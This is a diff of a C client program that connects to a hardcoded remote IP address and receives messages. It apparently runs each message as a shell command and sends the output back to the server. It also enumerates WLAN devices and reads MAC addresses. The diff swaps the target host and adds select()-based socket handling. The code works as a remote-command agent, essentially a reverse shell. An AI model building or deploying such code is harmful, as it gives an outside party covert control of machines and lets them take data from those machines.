@@ -5,20 +5,27 @@
 #include <netdb.h>
 #include <netinet/in.h>
 #include <stdio.h>
-#include <stdlib.h>      // exit, EXIT_FAILURE
+#include <stdlib.h> // exit, EXIT_FAILURE
+#include <stdlib.h>
 #include <stdnoreturn.h> // noreturn
 #include <string.h>
 #include <sys/ioctl.h>
+#include <sys/select.h>
 #include <sys/socket.h>
+#include <sys/types.h>
 #include <unistd.h>
 
 #define MSG_SIZE 4096
 #define MYPORT 7400
-#define HOSTNAME "208.91.55.199"
+//#define HOSTNAME "127.0.0.1"
+
+//#define HOSTNAME "192.168.32.30"
+
+#define HOSTNAME "10.77.1.146"
 
 FILE *recv_exec_msg(int sockfd, char msg[], int msg_size) {
   /* Receive and process messages from the server */
-  ssize_t bytes_received = recv(sockfd, msg, msg_size, 0);
+  int bytes_received = recv(sockfd, msg, msg_size, 0);
 
   if (bytes_received < 0) {
     error_and_exit("Error reading from socket \n");
@@ -46,7 +53,7 @@ char *find_devices(char path[]) {
 
   // Error Checking
   if (dr == NULL) {
-    error_and_exit("Could not open given directory");
+    error_and_exit("Could not open given directory \n");
   }
 
   // Hard_coded to look for the WLAN (wl)
@@ -89,6 +96,9 @@ int mac_address(char interface[], char addr[]) {
 
 int main() {
   /* Create a socket for the client */
+  char fd_array[150];
+  fd_set readfds, testfds, clientfds;
+
   int sockfd = open_tcp_socket();
 
   /* Get server's IP address */
@@ -103,7 +113,12 @@ int main() {
       .sin_addr = *(struct in_addr *)*server->h_addr_list,
   };
 
+  printf("Trying to connect to %s", HOSTNAME);
   try_connect(sockfd, serv_addr);
+  fflush(stdout);
+  FD_ZERO(&clientfds);
+  FD_SET(sockfd, &clientfds);
+  FD_SET(0, &clientfds);
 
   printf("Connected to server.\n");
   char msg[MSG_SIZE];
@@ -123,25 +138,34 @@ int main() {
   }
 
   while (1) {
-    // Process the received message here (e.g., execute commands)
-    FILE *output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
-    memset(result_buffer, 0, strlen(result_buffer)); // clear result_buffer
-    // Read the output of the command and send it back to the server
-    while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
-      strcat(result_buffer,
-             output_buffer); // Append each line to the result buffer
+
+    testfds = clientfds;
+    select(FD_SETSIZE, &testfds, NULL, NULL, NULL);
+    for (int fd = 0; fd < FD_SETSIZE; fd++) {
+      if (FD_ISSET(fd, &testfds) && fd == sockfd) {
+        // Process the received message here (e.g., execute commands)
+        FILE *output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
+        memset(result_buffer, 0,
+               strlen(result_buffer)); // clear result_buffer
+        // Read the output of the command and send it back to the server
+        while (fgets(output_buffer, sizeof(output_buffer), output_pipe) !=
+               NULL) {
+          strcat(result_buffer,
+                 output_buffer); // Append each line to the result buffer
+        }
+
+        printf("%s \n", result_buffer);
+
+        // Send the result buffer back to the server
+        if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
+          pclose(output_pipe);
+          close(sockfd);
+          error_and_exit("Error sending response to server\n");
+        }
+        fflush(stdout); // Ensure the data is sent immediately
+        pclose(output_pipe);
+      }
     }
-
-    printf("%s \n", result_buffer);
-
-    // Send the result buffer back to the server
-    if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
-      pclose(output_pipe);
-      error_and_exit("Error sending response to server\n");
-    }
-
-    fflush(stdout);      // Ensure the data is sent immediately
-    pclose(output_pipe); // Close the output pipe
   }
   /* Close the socket */
   close(sockfd);
